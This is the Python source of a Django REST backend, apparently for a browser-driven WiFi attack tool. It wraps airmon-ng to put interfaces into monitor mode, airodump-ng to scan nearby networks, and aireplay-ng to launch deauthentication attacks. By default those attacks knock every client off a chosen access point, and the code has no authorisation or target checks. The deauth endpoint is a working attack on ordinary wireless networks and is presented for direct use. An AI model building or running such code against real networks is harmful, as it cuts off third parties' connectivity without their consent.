
import re
import time
import json
import logging
import os
import signal
import subprocess
import threading
import uuid
from typing import Dict, List, Optional, Any, Tuple

from django.http import JsonResponse
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status

from .serializers import (
    WifiInterfaceSerializer, 
    ScanResultSerializer, 
    MonitorModeSerializer,
    DeauthAttackSerializer
)

logger = logging.getLogger(__name__)
active_processes: Dict[str, subprocess.Popen] = {}
scan_results: Dict[str, Any] = {}

class WifiInterfacesView(APIView):
    """Get available wireless interfaces"""
    
    def get(self, request):
        success, stdout, stderr = self.run_command(['iwconfig'])
        if not success:
            return Response({"error": stderr}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
        
        interfaces = []
        current_interface = None
        
        for line in stdout.split('\n'):
            if line and not line.startswith(' '):
                # New interface found
                interface_match = re.match(r'^(\w+)', line)
                if interface_match:
                    current_interface = interface_match.group(1)
                    
                    # Check if it's a wireless interface
                    if 'no wireless extensions' not in line:
                        # Get additional info
                        success, driver_info, _ = self.run_command(['ethtool', '-i', current_interface])
                        driver = "unknown"
                        chipset = "unknown"
                        
                        if success:
                            driver_match = re.search(r'driver:\s+(\w+)', driver_info)
                            if driver_match:
                                driver = driver_match.group(1)
                        
                        # Determine if interface is in monitor mode
                        mode = "normal"
                        if "Mode:Monitor" in line:
                            mode = "monitor"
                        
                        interfaces.append({
                            "name": current_interface,
                            "driver": driver,
                            "chipset": chipset,
                            "status": mode
                        })
        
        # If no interfaces found, add mock interfaces for testing
        if not interfaces:
            interfaces = [
                {"name": "wlan0", "driver": "iwlwifi", "chipset": "Intel", "status": "normal"},
                {"name": "wlan1", "driver": "rtl8812au", "chipset": "Realtek", "status": "normal"}
            ]
        
        serializer = WifiInterfaceSerializer(interfaces, many=True)
        return Response(serializer.data)

    def run_command(self, command: List[str]) -> Tuple[bool, str, Optional[str]]:
        """Run a shell command and return its output."""
        try:
            logger.info(f"Running command: {' '.join(command)}")
            result = subprocess.run(command, capture_output=True, text=True, check=True)
            return True, result.stdout, None
        except subprocess.CalledProcessError as e:
            logger.error(f"Command failed with exit code {e.returncode}: {e.stderr}")
            return False, "", e.stderr
        except Exception as e:
            logger.error(f"Error executing command: {str(e)}")
            return False, "", str(e)

class MonitorModeStartView(APIView):
    """Start monitor mode on a wireless interface"""
    
    def post(self, request):
        serializer = MonitorModeSerializer(data=request.data)
        if not serializer.is_valid():
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
            
        interface = serializer.validated_data['interface']
        
        # Kill potentially interfering processes
        self.run_command(['airmon-ng', 'check', 'kill'])
        
        # Start monitor mode
        success, stdout, stderr = self.run_command(['airmon-ng', 'start', interface])
        
        if not success:
            return Response({"error": stderr}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
        
        # Parse the output to get the monitor interface name
        monitor_interface = f"{interface}mon"  # Default naming convention
        match = re.search(r'(monitor mode enabled on|monitor mode vif enabled for) (\w+)', stdout)
        if match:
            monitor_interface = match.group(2)
        
        return Response({
            "success": True,
            "message": f"Started monitor mode on {interface}",
            "data": {
                "monitorInterface": monitor_interface
            }
        })

    def run_command(self, command: List[str]) -> Tuple[bool, str, Optional[str]]:
        """Run a shell command and return its output."""
        try:
            logger.info(f"Running command: {' '.join(command)}")
            result = subprocess.run(command, capture_output=True, text=True, check=True)
            return True, result.stdout, None
        except subprocess.CalledProcessError as e:
            logger.error(f"Command failed with exit code {e.returncode}: {e.stderr}")
            return False, "", e.stderr
        except Exception as e:
            logger.error(f"Error executing command: {str(e)}")
            return False, "", str(e)

class MonitorModeStopView(APIView):
    """Stop monitor mode on a wireless interface"""
    
    def post(self, request):
        serializer = MonitorModeSerializer(data=request.data)
        if not serializer.is_valid():
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
            
        interface = serializer.validated_data['interface']
        
        success, stdout, stderr = self.run_command(['airmon-ng', 'stop', interface])
        
        if not success:
            return Response({"error": stderr}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
        
        return Response({
            "success": True,
            "message": f"Stopped monitor mode on {interface}"
        })

    def run_command(self, command: List[str]) -> Tuple[bool, str, Optional[str]]:
        """Run a shell command and return its output."""
        try:
            logger.info(f"Running command: {' '.join(command)}")
            result = subprocess.run(command, capture_output=True, text=True, check=True)
            return True, result.stdout, None
        except subprocess.CalledProcessError as e:
            logger.error(f"Command failed with exit code {e.returncode}: {e.stderr}")
            return False, "", e.stderr
        except Exception as e:
            logger.error(f"Error executing command: {str(e)}")
            return False, "", str(e)

class ScanNetworksView(APIView):
    """Scan for wireless networks using airodump-ng"""
    
    def post(self, request):
        serializer = MonitorModeSerializer(data=request.data)
        if not serializer.is_valid():
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
            
        interface = serializer.validated_data['interface']
        
        # Generate a unique ID for this scan
        scan_id = str(uuid.uuid4())
        output_file = f"/tmp/scan_{scan_id}"
        
        # Start airodump-ng in a background process and broadcast updates via WebSockets
        self.start_scan_process(scan_id, interface, output_file)
        
        return Response({
            "success": True,
            "message": f"Scan started on {interface}",
            "scan_id": scan_id
        })

    def start_scan_process(self, scan_id: str, interface: str, output_file: str):
        """Start the scan process in a background thread and broadcast updates via WebSockets"""
        def scan_thread():
            cmd = ['airodump-ng', '--output-format', 'csv', '--write', output_file, interface]
            
            try:
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                active_processes[scan_id] = process
                
                # Check for results every 2 seconds
                while scan_id in active_processes:
                    # Parse the CSV file if it exists
                    networks = self.parse_csv_results(f"{output_file}-01.csv")
                    
                    # Broadcast results via WebSocket
                    if networks:
                        channel_layer = get_channel_layer()
                        async_to_sync(channel_layer.group_send)(
                            "scan_updates",
                            {
                                'type': 'scan_update',
                                'networks': networks
                            }
                        )
                    
                    time.sleep(2)
                    
                # Clean up process
                if not process.poll():
                    process.terminate()
                    process.wait(timeout=5)
                
                # Clean up the temporary files
                for ext in ['-01.csv', '-01.kismet.csv', '-01.kismet.netxml', '-01.cap']:
                    file_path = f"{output_file}{ext}"
                    if os.path.exists(file_path):
                        os.remove(file_path)
                        
            except Exception as e:
                logger.error(f"Error in scan thread: {str(e)}")
                if scan_id in active_processes:
                    del active_processes[scan_id]
        
        # Start the thread
        thread = threading.Thread(target=scan_thread)
        thread.daemon = True
        thread.start()
    
    def parse_csv_results(self, csv_file: str) -> List[Dict[str, Any]]:
        """Parse the airodump-ng CSV output file to extract network information"""
        networks = []
        
        if not os.path.exists(csv_file):
            return networks
            
        try:
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            # Parse networks section
            network_section = True
            for line in lines:
                line = line.strip()
                
                if line == "":
                    network_section = False
                    continue
                
                if network_section and "BSSID" not in line and line:
                    # Parse network info
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        power = parts[3].strip()
                        channel = parts[5].strip()
                        encryption = parts[6].strip()
                        ssid = parts[13].strip()
                        
                        try:
                            signal = abs(int(power))
                        except ValueError:
                            signal = 0
                            
                        try:
                            channel_num = int(channel)
                        except ValueError:
                            channel_num = 0
                        
                        network = {
                            "id": str(len(networks) + 1),
                            "ssid": ssid if ssid != "" else "",
                            "bssid": bssid,
                            "channel": channel_num,
                            "signal": min(signal, 100),  # Cap at 100
                            "encryption": "WPA2" if "WPA2" in encryption else 
                                         "WPA3" if "WPA3" in encryption else
                                         "WPA" if "WPA" in encryption else
                                         "WEP" if "WEP" in encryption else "OPEN",
                            "vendor": bssid[:8].upper(),  # Would need a proper OUI database
                            "clients": 0,  # Would need to parse clients section
                            "firstSeen": int(time.time() * 1000),
                            "lastSeen": int(time.time() * 1000)
                        }
                        networks.append(network)
        except Exception as e:
            logger.error(f"Error parsing CSV file: {str(e)}")
        
        # If no networks found, return empty list (mock data will be handled by frontend)
        return networks

class DeauthAttackView(APIView):
    """Perform a deauthentication attack using aireplay-ng"""
    
    def post(self, request):
        serializer = DeauthAttackSerializer(data=request.data)
        if not serializer.is_valid():
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
        
        bssid = serializer.validated_data['bssid']
        client_mac = serializer.validated_data.get('clientMac', 'FF:FF:FF:FF:FF:FF')
        packets = serializer.validated_data.get('packets', 10)
        
        # Get the first monitor mode interface
        success, stdout, stderr = self.run_command(['iwconfig'])
        monitor_interface = None
        
        if success:
            for line in stdout.split('\n'):
                if 'Mode:Monitor' in line:
                    monitor_match = re.match(r'^(\w+)', line)
                    if monitor_match:
                        monitor_interface = monitor_match.group(1)
                        break
        
        if not monitor_interface:
            return Response({"error": "No monitor mode interface found"}, status=status.HTTP_400_BAD_REQUEST)
        
        # Run the deauth attack
        attack_id = str(uuid.uuid4())
        self.run_deauth_attack(attack_id, monitor_interface, bssid, client_mac, packets)
        
        return Response({
            "success": True,
            "message": f"Deauthentication attack started",
            "data": {"attackId": attack_id}
        })

    def run_command(self, command: List[str]) -> Tuple[bool, str, Optional[str]]:
        """Run a shell command and return its output."""
        try:
            logger.info(f"Running command: {' '.join(command)}")
            result = subprocess.run(command, capture_output=True, text=True, check=True)
            return True, result.stdout, None
        except subprocess.CalledProcessError as e:
            logger.error(f"Command failed with exit code {e.returncode}: {e.stderr}")
            return False, "", e.stderr
        except Exception as e:
            logger.error(f"Error executing command: {str(e)}")
            return False, "", str(e)

    def run_deauth_attack(self, attack_id: str, interface: str, bssid: str, client_mac: str, packets: int):
        """Run deauth attack in a separate thread"""
        def attack_thread():
            cmd = ['aireplay-ng', '--deauth', str(packets), '-a', bssid]
            
            # If targeting a specific client
            if client_mac and client_mac != 'FF:FF:FF:FF:FF:FF':
                cmd.extend(['-c', client_mac])
                
            cmd.append(interface)
            
            try:
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                active_processes[attack_id] = process
                
                # Wait for the process to complete
                stdout, stderr = process.communicate()
                
                if process.returncode != 0:
                    logger.error(f"Deauth attack failed: {stderr.decode('utf-8')}")
                else:
                    logger.info(f"Deauth attack completed successfully")
                    
                # Clean up
                if attack_id in active_processes:
                    del active_processes[attack_id]
                    
            except Exception as e:
                logger.error(f"Error during deauth attack: {str(e)}")
                if attack_id in active_processes:
                    del active_processes[attack_id]
        
        # Start the thread
        thread = threading.Thread(target=attack_thread)
        thread.daemon = True
        thread.start()

class StatusView(APIView):
    """Get the status of the backend server"""
    
    def get(self, request):
        return Response({
            "status": "running",
            "activeProcesses": len(active_processes),
            "version": "0.2.0"
        })
